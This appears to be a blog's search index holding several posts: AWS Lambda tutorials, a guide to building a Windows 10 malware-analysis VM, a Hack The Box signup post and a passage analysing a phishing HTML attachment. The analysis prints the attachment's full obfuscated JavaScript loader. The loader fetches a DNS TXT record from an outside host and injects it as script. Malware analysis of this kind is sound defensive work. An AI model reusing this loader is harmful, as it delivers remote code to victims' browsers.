written in different programming languages. Here is a list of these languages: AWS Lambda Runtime Frameworks","title":"Introduction"},{"location":"posts/2018/post2/2018-11-12-HowToCreateAnAWSLambdaFunction/#instructions","text":"The process to create a Lambda Function is broken down into the following steps: Step 1 - AWS Account Overview Step 2 - Create a Lambda Function Step 3 - Add Trigger from 'CloudWatch Event' Step 4 - Create the Handler Function Step 5 - Zip your Code and Upload it Step 6 - Configure Test Event and Test","title":"Instructions"},{"location":"posts/2018/post2/2018-11-12-HowToCreateAnAWSLambdaFunction/#step-1-aws-account-overview","text":"You will need to sign up for an AWS Account. The sign up process will require you to enter Credit Card information. There are different tiers for an AWS account. With the 'Free Tier' you can run 1M Requests per Month and 400,000 GB-seconds of compute time per month. Links: Console AWS AWS Lambda Pricing","title":"Step 1 -  AWS Account Overview"},{"location":"posts/2018/post2/2018-11-12-HowToCreateAnAWSLambdaFunction/#step-2-create-a-lambda-function","text":"Now that you've signed up for an AWS account, you're ready to create a Lambda function. From 'Services' Menu select 'Lambda'. AWS Services Click on ' Create a function'. Select 'Author from scratch'. Create a Function 1 Fill in the 'Name' of the function, Runtime, Role and Role Name. Create a Function 2 Roles are created based on the permissions that you want to grant to your AWS Lambda function. AWS Lambda Permissions Model can be reviewed at https://docs.aws.amazon.com/lambda/latest/dg/intro-permission-model.html#lambda-intro-execution-role","title":"Step 2 - Create a Lambda Function"},{"location":"posts/2018/post2/2018-11-12-HowToCreateAnAWSLambdaFunction/#step-3-add-trigger-from-cloudwatch-event","text":"Once you created your function, you will see something like this. Click on 'CloudWatch Events' on the left tool bar. Create a Function 2 Configure the trigger by configuring a new Rule. You can use cron or rate expressions to configure the rule. Here the rule is configured with cron (0 13 * * ? *) to run daily at 13:00 GMT. Link for additional details on Cron Expressions: Cron Expressions Creating a Trigger Save your function after configuring the Trigger Rule. You will see something like this: Cron Expression Trigger","title":"Step 3 - Add Trigger from 'CloudWatch Event'"},{"location":"posts/2018/post2/2018-11-12-HowToCreateAnAWSLambdaFunction/#step-4-create-the-handler-function","text":"Your code needs to contain a lambda event handler. The name of the event handler function needs to be configured in the AWS Web GUI. This is shown below: Lambda Handler Function The code for the event handler looks something like this: import json def lambda_handler ( event , context ): # TODO implement return { 'statusCode' : 200 , 'body' : json . dumps ( 'Hello from Lambda!' ) } Your code will need to include a handler similar to above. The #ToDo implement can be replaced with main(), if you have a main() function defined in your code.","title":"Step 4 - Create the Handler Function"},{"location":"posts/2018/post2/2018-11-12-HowToCreateAnAWSLambdaFunction/#step-5-zip-your-code-and-upload-it","text":"Now that your code is ready. There is one more step prior to creating a zip file. Any 3 rd party libraries that your code imports needs to be included in the .zip file. For example, if your code imports Python-twitter libraries, you will need to install the libraries in the code directory. This can be done with the following command executed from your code directory: Windows: pip install python-twitter -t . Linux: pip instaall python-twitter -t $(pwd) After the code directory includes all the 3 rd party libraries and the code, you need to create a .zip file that includes everything. The .zip file may look something like this. Lambda Function .zip File Now upload the .zip file to the Lambda function. Upload .zip File","title":"Step 5 - Zip your Code and Upload it"},{"location":"posts/2018/post2/2018-11-12-HowToCreateAnAWSLambdaFunction/#step-6-configure-test-event-and-test","text":"Now you have created a trigger and uploaded your code, you're ready for testing. Click on 'Test' button to create a test event. Test Here is how the test event creation may look like: Create Test Event You can configure the test event based on the scenario you want to test. If your code doesn't require any input parameters, you can click on 'Create' to test your code. Make sure to 'Save' your function periodically.","title":"Step 6 - Configure Test Event and Test"},{"location":"posts/2018/post2/2018-11-12-HowToCreateAnAWSLambdaFunction/#summary","text":"You're done!!! Good Job, you've created a lambda function. Here are some things that you might of done if you followed through with the article: Setup and configured your 'free tier' AWS account. Created an AWS Lambda Function. Added a 'CloudWatch Event' to trigger your function once a day. Added an event handler function to your code to handle the trigger from the 'CloudWatch Event'. Installed 3 rd party libraries in your code directory. Created a .zip archive for your code and uploaded it. Created a Test event to test out your code. In a future article I'll touch base on how to do this with AWS SAM (Serverless Application Model) CLI.","title":"Summary"},{"location":"posts/2018/post3/2018-12-16-HowToCreateAnAWSLambdaLayer/","text":"AWS Lambda Layer Introduction \u00b6 This article will walk you through creating an AWS Lambda Layer. What is a Lambda Layer? \u00b6 A layer is a Zip file that contains libraries, a custom runtime, or other dependencies for your Lambda function. Instructions \u00b6 The process to create a Lambda layer is broken down into the following steps: Creating the .Zip Library Creating a Lambda Layer Adding a Layer to a Lambda Function Step 1 - Creating the .Zip Library \u00b6 To create a library you need to create a ZIP file of the library. You need to place the library in one of the folders that is supported by the runtime. Link: Lambda Layer Library Configurations For example for Python, you need to place the library in the specific python runtime folder: Python Layer Folder Structure The .ZIP file can be given any name. For example if you're including the twitter library, you can name it 'twitter.zip'. Here is how the .ZIP file may look: Twitter Layer Folder Step 2 - Creating a Lambda Layer \u00b6 Log in to AWS Management Console and go to the Lambda service. Click on Layers on the left hand side and select Create Layer. AWS Lambda Layers Create a Layer Fill out the Create Layer form, you will need to upload the .ZIP file created in Step 1 of this article. You will need to provide a link of the license information for the library. Layer Created Step 3 - Adding a Layer to a Lambda Function \u00b6 Once you've created the Lambda Layer, you need to add it to a Lambda Function. To do this, open up the Lambda Function. Click on Layers and click on Add a Layer. A Lambda Function Select your layer and version of the layer. You can also provide a layer version ARN to select a public layer. Add layer to Function Now that you added the layer to your function, it should be listed under 'Referenced layers'. Summary \u00b6 This article introduced layers, showed how you can create a layer and reference it in a Lambda Function. These layers can be used for various Lambda functions. There is a concept of Merge order and Public Layers that I didn't touch on in this article. We will explore these options in future articles.","title":"How to Create an AWS Lambda Layer"},{"location":"posts/2018/post3/2018-12-16-HowToCreateAnAWSLambdaLayer/#introduction","text":"This article will walk you through creating an AWS Lambda Layer.","title":"Introduction"},{"location":"posts/2018/post3/2018-12-16-HowToCreateAnAWSLambdaLayer/#what-is-a-lambda-layer","text":"A layer is a Zip file that contains libraries, a custom runtime, or other dependencies for your Lambda function.","title":"What is a Lambda Layer?"},{"location":"posts/2018/post3/2018-12-16-HowToCreateAnAWSLambdaLayer/#instructions","text":"The process to create a Lambda layer is broken down into the following steps: Creating the .Zip Library Creating a Lambda Layer Adding a Layer to a Lambda Function","title":"Instructions"},{"location":"posts/2018/post3/2018-12-16-HowToCreateAnAWSLambdaLayer/#step-1-creating-the-zip-library","text":"To create a library you need to create a ZIP file of the library. You need to place the library in one of the folders that is supported by the runtime. Link: Lambda Layer Library Configurations For example for Python, you need to place the library in the specific python runtime folder: Python Layer Folder Structure The .ZIP file can be given any name. For example if you're including the twitter library, you can name it 'twitter.zip'. Here is how the .ZIP file may look: Twitter Layer Folder","title":"Step 1 - Creating the .Zip Library"},{"location":"posts/2018/post3/2018-12-16-HowToCreateAnAWSLambdaLayer/#step-2-creating-a-lambda-layer","text":"Log in to AWS Management Console and go to the Lambda service. Click on Layers on the left hand side and select Create Layer. AWS Lambda Layers Create a Layer Fill out the Create Layer form, you will need to upload the .ZIP file created in Step 1 of this article. You will need to provide a link of the license information for the library. Layer Created","title":"Step 2 - Creating a Lambda Layer"},{"location":"posts/2018/post3/2018-12-16-HowToCreateAnAWSLambdaLayer/#step-3-adding-a-layer-to-a-lambda-function","text":"Once you've created the Lambda Layer, you need to add it to a Lambda Function. To do this, open up the Lambda Function. Click on Layers and click on Add a Layer. A Lambda Function Select your layer and version of the layer. You can also provide a layer version ARN to select a public layer. Add layer to Function Now that you added the layer to your function, it should be listed under 'Referenced layers'.","title":"Step 3 - Adding a Layer to a Lambda Function"},{"location":"posts/2018/post3/2018-12-16-HowToCreateAnAWSLambdaLayer/#summary","text":"This article introduced layers, showed how you can create a layer and reference it in a Lambda Function. These layers can be used for various Lambda functions. There is a concept of Merge order and Public Layers that I didn't touch on in this article. We will explore these options in future articles.","title":"Summary"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/","text":"Introduction \u00b6 This article will walk you through creating a Windows 10 VM for Malware Analysis, Forensic and Offensive Tasks. Warning \u00b6 This VM is not for everyone. If you're thinking this is not a good idea, you're right! You should probably skip this article and save yourself some time! For the rest, lets continue. As one of my heroes use to say... With great power comes great responsibility. Here is what we're trying to build: The VM The \"VM\" \u00b6 Download and Install a Virtualization Software \u00b6 There are many different flavors of virtualization software. Here are some of the links for easy access: VirtualBox Hyper-V VMware Workstation VMware Fusion Parallels Others This article uses VirtualBox however you can any virtualization software. If you haven't by this point, download and install your virtualization software. Download a Windows 10 VM \u00b6 Thanks to Microsoft we can download a VM directly from their website and save the headache and time installing an OS. Here are different options for Windows 10 VM: * Get a Windows 10 development environment * Test Microsoft Edge/IE version VMs I prefer the Windows 10 Development environment. It is a little larger than the other VMs, but it comes with Visual Studio 2017 and Windows Subsystem for Linux (Ubuntu) installed. You're getting two installed OSes by just downloading a single VM. A couple of notes: Default Windows password for these VMs are 'Passw0rd!'. Default Bash su/sudo password is 'password' If you haven't by this point, download and import your Windows 10 VM into your virtualization software. Unicorn VM Very Important: If you haven't picked a COOL AMAZING name for your VM, stop here and meditate on it. Do Not Proceed until you have done this step. Okay, lets move on to isolation. Isolation \u00b6 On to a more challenging topic, Isolation. This is a NP-hard problem. If you haven't spent some time thinking about isolation yet, stop and meditate on it. Build the perfect isolated environment in your head and then come up with ways to escape it. Here is an article that may help with your meditation. Some of the questions that you need to think about: * What are the ways something can escape the VM? * What are the likelihood of these ways? * What's the worst thing that can happen if something escapes the VM? * How can I recover (data, system, myself)? * Can the Host be hardened? This section will vary for every individual. The level of isolation required is propositional to the importance and level of secrecy of the information you have or are close to. Are you or coworkers protecting Propriety information, Patient information or Pandora's box? In the later case, an underground mountain with no internet access may be a wise choice. A good analyst is mindful of these answers when doing any type of analysis. Install Guest Tools (Optional) \u00b6 Most virtualization software have Guest Tools that can be installed on the VM. These tools enable various functionalities, eg: file sharing, clipboard sharing, printing and etc... Here are some Pros and Cons for installing Guest tools: Pros \u00b6 It's easier to share files between host and guest. It's easier to copy and paste commands between the two. Cons \u00b6 Some malware can detect these tools and will change their behavior. Higher chance of malware escaping the isolated environment. Network Isolation \u00b6 Be mindful of network isolation. Lack of Network isolation is another way malware can escape the VM. If you're reverse engineering a malware, make sure your VM is disconnected from the network or use FakeNet-NG or Host only network. Host Isolation \u00b6 If you have resources to use a dedicated Host for this VM, then do it!!! Configuration and Installation \u00b6 This section will discuss the configuration of Windows 10 VM and installing the toolkits. The toolkits that are installed in this section are: FLARE COMMANDO SIFT KAPE Windows 10 VM Configuration \u00b6 Now you have a Windows 10 VM. In this step you will customize and configure the VM for your use. Perform Windows Update \u00b6 Run windows update and install all available updates. Privacy Settings \u00b6 Take a few minutes to review the privacy settings in the Windows 10 VM. This can be accessed by going to Settings > Privacy. Windows 10 Privacy Settings Bash/Windows Folder Sharing \u00b6 You're likely going to be switching between Linux bash and Windows. You can save some time by setting up a couple of symbolic links in Linux. Create two empty folders on your Windows Desktop. You can call them \"Malware\" and \"Tools\". You can create the symbolic links in Linux as follow: sudo ln -s /mnt/c/Users/User/Desktop/Malware ~/ sudo ln -s /mnt/c/Users/User/Desktop/Tools ~/ You can use these folders to quickly transfer files and tools between the two OSes. Beware that malware can escape from these folders!!! Install FLARE \u00b6 To install FLARE you need to download the toolkit from here . You will then need to extract the files and run .\\install.ps1 in Powershell. You can view detailed instructions for installing FLARE here . The setup will reboot the VM a few times to install the tools. The full install may take a few hours depending on the VM performance. Install COMMANDO \u00b6 COMMANDO install is similar to FLARE install. First download the toolkit from here . Once the download is complete, extract the files and run .\\install.ps1 in Powershell. You can view detailed instructions for installing COMMANDO here . The setup will reboot the VM a few times to install the tools. The full install may take a few hours depending on the VM performance. Install SIFT \u00b6 SIFT is not fully supported in WSL. However you can install it with the following commands: wget https://github.com/sans-dfir/sift-cli/releases/download/v1.7.1/sift-cli-linux wget https://github.com/sans-dfir/sift-cli/releases/download/v1.7.1/sift-cli-linux.sha256.asc gpg --keyserver pgp.mit.edu --recv-keys 22598A94 gpg --verify sift-cli-linux.sha256.asc sha256sum -c sift-cli-linux.sha256.asc sudo mv sift-cli-linux /usr/local/bin/sift chmod 755 /usr/local/bin/sift sudo sift install --mode = packages-only Install olefile \u00b6 The Oledump tools require olefile. Here are the steps to download and install olefile: Downloading the files from here . Extract the files and copy them to the Tools folder your desktop. Run the following command in bash from the Tools folder: Sudo python setup.py install Install KAPE \u00b6 KAPE is a must have Forensic tool that's been developed by Eric Zimmerman. You can Download it from here . You can read additional information about this tool here . Install MS Office (Optional) \u00b6 This is an optional step. If you do any MS Office Document malware reverse engineering, you may choice to install MS Office. Cleanup and Snapshot \u00b6 You're in the last mile, you can see the end and can't wait. There is a few more things you need to do prior to using your VM. Here are some of the things you need to do: Delete the installation files from your VM. Empty your Recycle Bin Set your favorite background. Pin your favorite tools to the taskbar. Run Disk Clean up on the VM. Run Disk Defrag. Run sdelete -z c: Compact the VM Disk in your virtualization software. VERY IMPORTANT: Take a SNAPSHOT of your VM and give it a name and tag it with \"- Clean - DATE\". AND now lets take a few step back and see what we got!!! Close enough! Summary \u00b6 This article provided some references and steps to create a Windows 10 VM for Malware Anlaysis, Offensive and Forensic tasks with FLARE, COMMANDO, SIFT and KAPE. I hope you enjoyed the article, if this article doesn't contain any of your favorite tools shoot me a message on twitter.","title":"How to Create a Win10 VM for Malware Analysis, Forensic or Offensive Tasks"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#introduction","text":"This article will walk you through creating a Windows 10 VM for Malware Analysis, Forensic and Offensive Tasks.","title":"Introduction"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#warning","text":"This VM is not for everyone. If you're thinking this is not a good idea, you're right! You should probably skip this article and save yourself some time! For the rest, lets continue. As one of my heroes use to say... With great power comes great responsibility. Here is what we're trying to build: The VM","title":"Warning"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#the-vm","text":"","title":"The \"VM\""},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#download-and-install-a-virtualization-software","text":"There are many different flavors of virtualization software. Here are some of the links for easy access: VirtualBox Hyper-V VMware Workstation VMware Fusion Parallels Others This article uses VirtualBox however you can any virtualization software. If you haven't by this point, download and install your virtualization software.","title":"Download and Install a Virtualization Software"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#download-a-windows-10-vm","text":"Thanks to Microsoft we can download a VM directly from their website and save the headache and time installing an OS. Here are different options for Windows 10 VM: * Get a Windows 10 development environment * Test Microsoft Edge/IE version VMs I prefer the Windows 10 Development environment. It is a little larger than the other VMs, but it comes with Visual Studio 2017 and Windows Subsystem for Linux (Ubuntu) installed. You're getting two installed OSes by just downloading a single VM. A couple of notes: Default Windows password for these VMs are 'Passw0rd!'. Default Bash su/sudo password is 'password' If you haven't by this point, download and import your Windows 10 VM into your virtualization software. Unicorn VM Very Important: If you haven't picked a COOL AMAZING name for your VM, stop here and meditate on it. Do Not Proceed until you have done this step. Okay, lets move on to isolation.","title":"Download a Windows 10 VM"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#isolation","text":"On to a more challenging topic, Isolation. This is a NP-hard problem. If you haven't spent some time thinking about isolation yet, stop and meditate on it. Build the perfect isolated environment in your head and then come up with ways to escape it. Here is an article that may help with your meditation. Some of the questions that you need to think about: * What are the ways something can escape the VM? * What are the likelihood of these ways? * What's the worst thing that can happen if something escapes the VM? * How can I recover (data, system, myself)? * Can the Host be hardened? This section will vary for every individual. The level of isolation required is propositional to the importance and level of secrecy of the information you have or are close to. Are you or coworkers protecting Propriety information, Patient information or Pandora's box? In the later case, an underground mountain with no internet access may be a wise choice. A good analyst is mindful of these answers when doing any type of analysis.","title":"Isolation"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#install-guest-tools-optional","text":"Most virtualization software have Guest Tools that can be installed on the VM. These tools enable various functionalities, eg: file sharing, clipboard sharing, printing and etc... Here are some Pros and Cons for installing Guest tools:","title":"Install Guest Tools (Optional)"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#pros","text":"It's easier to share files between host and guest. It's easier to copy and paste commands between the two.","title":"Pros"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#cons","text":"Some malware can detect these tools and will change their behavior. Higher chance of malware escaping the isolated environment.","title":"Cons"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#network-isolation","text":"Be mindful of network isolation. Lack of Network isolation is another way malware can escape the VM. If you're reverse engineering a malware, make sure your VM is disconnected from the network or use FakeNet-NG or Host only network.","title":"Network Isolation"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#host-isolation","text":"If you have resources to use a dedicated Host for this VM, then do it!!!","title":"Host Isolation"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#configuration-and-installation","text":"This section will discuss the configuration of Windows 10 VM and installing the toolkits. The toolkits that are installed in this section are: FLARE COMMANDO SIFT KAPE","title":"Configuration and Installation"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#windows-10-vm-configuration","text":"Now you have a Windows 10 VM. In this step you will customize and configure the VM for your use.","title":"Windows 10 VM Configuration"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#perform-windows-update","text":"Run windows update and install all available updates.","title":"Perform Windows Update"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#privacy-settings","text":"Take a few minutes to review the privacy settings in the Windows 10 VM. This can be accessed by going to Settings > Privacy. Windows 10 Privacy Settings","title":"Privacy Settings"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#bashwindows-folder-sharing","text":"You're likely going to be switching between Linux bash and Windows. You can save some time by setting up a couple of symbolic links in Linux. Create two empty folders on your Windows Desktop. You can call them \"Malware\" and \"Tools\". You can create the symbolic links in Linux as follow: sudo ln -s /mnt/c/Users/User/Desktop/Malware ~/ sudo ln -s /mnt/c/Users/User/Desktop/Tools ~/ You can use these folders to quickly transfer files and tools between the two OSes. Beware that malware can escape from these folders!!!","title":"Bash/Windows Folder Sharing"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#install-flare","text":"To install FLARE you need to download the toolkit from here . You will then need to extract the files and run .\\install.ps1 in Powershell. You can view detailed instructions for installing FLARE here . The setup will reboot the VM a few times to install the tools. The full install may take a few hours depending on the VM performance.","title":"Install FLARE"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#install-commando","text":"COMMANDO install is similar to FLARE install. First download the toolkit from here . Once the download is complete, extract the files and run .\\install.ps1 in Powershell. You can view detailed instructions for installing COMMANDO here . The setup will reboot the VM a few times to install the tools. The full install may take a few hours depending on the VM performance.","title":"Install COMMANDO"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#install-sift","text":"SIFT is not fully supported in WSL. However you can install it with the following commands: wget https://github.com/sans-dfir/sift-cli/releases/download/v1.7.1/sift-cli-linux wget https://github.com/sans-dfir/sift-cli/releases/download/v1.7.1/sift-cli-linux.sha256.asc gpg --keyserver pgp.mit.edu --recv-keys 22598A94 gpg --verify sift-cli-linux.sha256.asc sha256sum -c sift-cli-linux.sha256.asc sudo mv sift-cli-linux /usr/local/bin/sift chmod 755 /usr/local/bin/sift sudo sift install --mode = packages-only","title":"Install SIFT"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#install-olefile","text":"The Oledump tools require olefile. Here are the steps to download and install olefile: Downloading the files from here . Extract the files and copy them to the Tools folder your desktop. Run the following command in bash from the Tools folder: Sudo python setup.py install","title":"Install olefile"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#install-kape","text":"KAPE is a must have Forensic tool that's been developed by Eric Zimmerman. You can Download it from here . You can read additional information about this tool here .","title":"Install KAPE"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#install-ms-office-optional","text":"This is an optional step. If you do any MS Office Document malware reverse engineering, you may choice to install MS Office.","title":"Install MS Office (Optional)"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#cleanup-and-snapshot","text":"You're in the last mile, you can see the end and can't wait. There is a few more things you need to do prior to using your VM. Here are some of the things you need to do: Delete the installation files from your VM. Empty your Recycle Bin Set your favorite background. Pin your favorite tools to the taskbar. Run Disk Clean up on the VM. Run Disk Defrag. Run sdelete -z c: Compact the VM Disk in your virtualization software. VERY IMPORTANT: Take a SNAPSHOT of your VM and give it a name and tag it with \"- Clean - DATE\". AND now lets take a few step back and see what we got!!! Close enough!","title":"Cleanup and Snapshot"},{"location":"posts/2019/post1/2019-04-06-HowToCreateAVM/#summary","text":"This article provided some references and steps to create a Windows 10 VM for Malware Anlaysis, Offensive and Forensic tasks with FLARE, COMMANDO, SIFT and KAPE. I hope you enjoyed the article, if this article doesn't contain any of your favorite tools shoot me a message on twitter.","title":"Summary"},{"location":"posts/2019/post2/2019-04-22-HowToSignUpForHackTheBox/","text":"Figure 1 - Hack the Box Website Introduction \u00b6 Hack The Box or HTB is one of the most popular CTF websites. This article will walk you through how to sign up for HTB tell you about Rule #7 . Here are some of the reasons to join HTB: Figure 2 - Reasons to join Hack The Box HTB has two membership models: Free and VIP (10 Euro/mo). Figure 3 shows the differences between these two models. Figure 3 - Free vs VIP membership models for HTB The website has a join link that mentions an 'Invite Challenge', as shown in Figure 4. Figure 4 - Join button with a hint to an 'Invite Challenge'. Instructions \u00b6 This section documents the steps to sign up for HTB by solving the 'Invite Challenge'. Required Tools \u00b6 This section has been removed due to Rule #7 . 'Join' Button \u00b6 Most section has been removed due to Rule #7 . The 'Join' button in Figure 4 directs users to https://www.hackthebox.eu/invite . Figure 5 shows the invite web page. The title of this web page contains the text 'Can you hack this box?'. This confirms that a challenge needs to be solved to join the website. Figure 5 - Invite Web page. Code Analysis \u00b6 Most of this section has been removed due to Rule #7 . The following lesson could be derived from the code analysis: If an observer doesn't understand the message, then encode it differently. Generating the invite \u00b6 This section has been removed due to Rule #7 . Signing Up for HTB \u00b6 The key from the last section was used to Sign up for HTB as shown in Figure 6. Figure 6 - Congratulations! Summary \u00b6 After writing this post and signing up I was greeted with the rules. Reviewing the rules, one rule pops out. Rule #7 mentions not sharing the generation technique of the invite code, as shown in Figure 7. Figure 7 - Dont spoil! Due to this rule, I've decided to remove most of this article. Keep Calm and Hack This Box (and Dont spoil)","title":"How to Sign Up for Hack The Box"},{"location":"posts/2019/post2/2019-04-22-HowToSignUpForHackTheBox/#introduction","text":"Hack The Box or HTB is one of the most popular CTF websites. This article will walk you through how to sign up for HTB tell you about Rule #7 . Here are some of the reasons to join HTB: Figure 2 - Reasons to join Hack The Box HTB has two membership models: Free and VIP (10 Euro/mo). Figure 3 shows the differences between these two models. Figure 3 - Free vs VIP membership models for HTB The website has a join link that mentions an 'Invite Challenge', as shown in Figure 4. Figure 4 - Join button with a hint to an 'Invite Challenge'.","title":"Introduction"},{"location":"posts/2019/post2/2019-04-22-HowToSignUpForHackTheBox/#instructions","text":"This section documents the steps to sign up for HTB by solving the 'Invite Challenge'.","title":"Instructions"},{"location":"posts/2019/post2/2019-04-22-HowToSignUpForHackTheBox/#required-tools","text":"This section has been removed due to Rule #7 .","title":"Required Tools"},{"location":"posts/2019/post2/2019-04-22-HowToSignUpForHackTheBox/#join-button","text":"Most section has been removed due to Rule #7 . The 'Join' button in Figure 4 directs users to https://www.hackthebox.eu/invite . Figure 5 shows the invite web page. The title of this web page contains the text 'Can you hack this box?'. This confirms that a challenge needs to be solved to join the website. Figure 5 - Invite Web page.","title":"'Join' Button"},{"location":"posts/2019/post2/2019-04-22-HowToSignUpForHackTheBox/#code-analysis","text":"Most of this section has been removed due to Rule #7 . The following lesson could be derived from the code analysis: If an observer doesn't understand the message, then encode it differently.","title":"Code Analysis"},{"location":"posts/2019/post2/2019-04-22-HowToSignUpForHackTheBox/#generating-the-invite","text":"This section has been removed due to Rule #7 .","title":"Generating the invite"},{"location":"posts/2019/post2/2019-04-22-HowToSignUpForHackTheBox/#signing-up-for-htb","text":"The key from the last section was used to Sign up for HTB as shown in Figure 6. Figure 6 - Congratulations!","title":"Signing Up for HTB"},{"location":"posts/2019/post2/2019-04-22-HowToSignUpForHackTheBox/#summary","text":"After writing this post and signing up I was greeted with the rules. Reviewing the rules, one rule pops out. Rule #7 mentions not sharing the generation technique of the invite code, as shown in Figure 7. Figure 7 - Dont spoil! Due to this rule, I've decided to remove most of this article. Keep Calm and Hack This Box (and Dont spoil)","title":"Summary"},{"location":"posts/2019/post3/2019-06-16-HowToDeobfuscateJS/","text":"Figure 1 - Obfuscated/Deobfucated JavaScript from a Phishing email Introduction \u00b6 Recently I came across an interesting phishing email. The email contained a XML HTML attachment. The HTML attachment contained a XML header with HTML markup and obfuscated JavaScript(JS) code. Figure 2 shows the phishing email 2 . Figure 2 - A Phishing Email with HTML Attachment Figure 3 shows the code contained in the attachment. Figure 3 - XML HTML File with Malicious JavaScript In this article we're going to analysis the HTML attachment. Instructions \u00b6 Lets get started. We're going to take a part the HTML attachment to see what each part does. We'll need some tools to do this. Required Tools \u00b6 Here are the tools you need: A Sandbox Lab (if you don't have one, then build one ) Didier Stevens's SpiderMonkey ( Link ) Upload the HTML attachment to your sandbox (Be Very Careful!). You can get a copy here (Usual Password) To reduce the risk of accidental double clicking on the malicious attachments you can do the following: Re-associate .html extensions to open in notepad or your favorite hex editor. This will reduce the chance of accidentally double clicking a malicious file while trying to transfer it to your sandbox. Why stop there? Re-associate other high risk extensions (ex. .doc, .xls, .pdf, .vbs, .js) to open in Notepad too. I may revisit this idea in another article. Lets Get Started \u00b6 Here is the code contained in the malicious HTML attachment: <?xml version=\"1.0\" encoding=\"utf-8\"?> <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns= \"http://www.w3.org/1999/xhtml\" > <head> <meta content= \"\" /><script type= \"text/javascript\" xml:space= \"preserve\" > // <![CDATA[ var v = window.atob(\"aHR0cHM6Ly9kbnMuZ29vZ2xlLmNvbS9yZXNvbHZlP25hbWU9ZmV0Y2guc2x6eGtjZWUuZ2xhbWlzYm91bmQuY29tJnR5cGU9VFhU\"); var _0x2b42=['0xc','open','GET','onreadystatechange','status','readyState','parse','responseText','createElement','script','innerHTML','substring','send','push','shift','0x0','0x1','0x2','0x3','0x4','0x5','0x6','0x7','data','0x8','0x9','0xa','0xb','length','body'];(function(_0x26248d,_0x33adc9){var _0x47fb3a=function(_0xb8f9b1){while(--_0xb8f9b1){_0x26248d['push'](_0x26248d['shift']());}};_0x47fb3a(++_0x33adc9);}(_0x2b42,0x97));var _0x58f7=function(_0x3aa2b9,_0x591490){_0x3aa2b9=_0x3aa2b9-0x0;var _0x2886d9=_0x2b42[_0x3aa2b9];return _0x2886d9;};function ccc(){var _0x3bf9f2=[_0x58f7('0x0'),_0x58f7('0x1'),_0x58f7('0x2'),_0x58f7('0x3'),_0x58f7('0x4'),_0x58f7('0x5'),_0x58f7('0x6'),'Answer',_0x58f7('0x7'),_0x58f7('0x8'),_0x58f7('0x9'),_0x58f7('0xa'),'appendChild',_0x58f7('0xb')];(function(_0x532510,_0x26a9cf){var _0x47b474=function(_0x5c32a3){while(--_0x5c32a3){_0x532510[_0x58f7('0xc')](_0x532510[_0x58f7('0xd')]());}};_0x47b474(++_0x26a9cf);}(_0x3bf9f2,0x1b2));var _0x58060d=function(_0x13b5d5,_0x174409){_0x13b5d5=_0x13b5d5-0x0;var _0x1aae1c=_0x3bf9f2[_0x13b5d5];return _0x1aae1c;};var _0x48f014=new XMLHttpRequest();_0x48f014[_0x58060d(_0x58f7('0xe'))](_0x58060d(_0x58f7('0xf')),v);_0x48f014[_0x58060d(_0x58f7('0x10'))]=function(){if(_0x48f014[_0x58060d(_0x58f7('0x11'))]==0xc8&&_0x48f014[_0x58060d(_0x58f7('0x12'))]==0x4){var _0x45edda=JSON[_0x58060d(_0x58f7('0x13'))](_0x48f014[_0x58060d(_0x58f7('0x14'))]);var _0x2e08f9=_0x45edda[_0x58060d(_0x58f7('0x15'))][0x0][_0x58f7('0x16')];var _0x599d3c=document[_0x58060d(_0x58f7('0x17'))](_0x58060d(_0x58f7('0x18')));_0x599d3c[_0x58060d(_0x58f7('0x19'))]=_0x2e08f9[_0x58060d(_0x58f7('0x1a'))](0x1,_0x2e08f9[_0x58f7('0x1b')]-0x1);document[_0x58f7('0x1c')][_0x58060d(_0x58f7('0x1d'))](_0x599d3c);}};_0x48f014[_0x58060d('0xd')]();} //]]> </script><script src= \"https://accounts.google.com/o/oauth2/revoke?callback=ccc()\" type= \"text/javascript\" xml:space= \"preserve\" ></script> <title></title> </head> <body> Loading... </body> </html> Here are some of the things that stand out : Line 1 is the XML header Line 2 is defining an HTML XML Document Line 3 start of the HTML document Line 5 script tag containing JavaScript Line 5 also contains interesting code - xml:space=\"preserve\">//<![CDATA[ Line 6-7 JS code Line 8 interesting end for a JavaScript - //]]> Line 9 end of first script and started of second script Line 12-14 the HTML body that shows the message \"Loading...\" Line 15 end of the html - There are two script blocks in the attachment. The first script block starts on Line 5 and it contains JavaScript code. Line 5 contains some interesting code: xml:space=\"preserve\">//<![CDATA[ The first part xml:space=\"preserve\"> is at the end of the HTML script tag. Here is what it means 3 : The xml:space=\"preserve\" directive says that space within element content is significant. It's basically a XML parser instruction that specifies space is important. The second part //<![CDATA[ is the start of the JavaScript code. In JavaScript // denotes a comment. Here is what <![CDATA[ means in XML [4]: The term CDATA means, Character Data. CDATA is defined as blocks of text that are not parsed by the parser, but are otherwise recognized as markup. ... Following is the syntax for CDATA section \u2212 <![CDATA[ characters with markup ]]> The above also explains Line 8 of the attachment file. ]]> means it's the end of the CDATA section. This leaves line 6 and 7 that is the actual obfuscated JS code. Lets take a closer look. First, lets see if we can make the code more readable using a JS beautifier. There are many different websites online that provide this service. On our sandbox, using the one here we beautify line 6 and 7. Here is resulting code: var v = window . atob ( 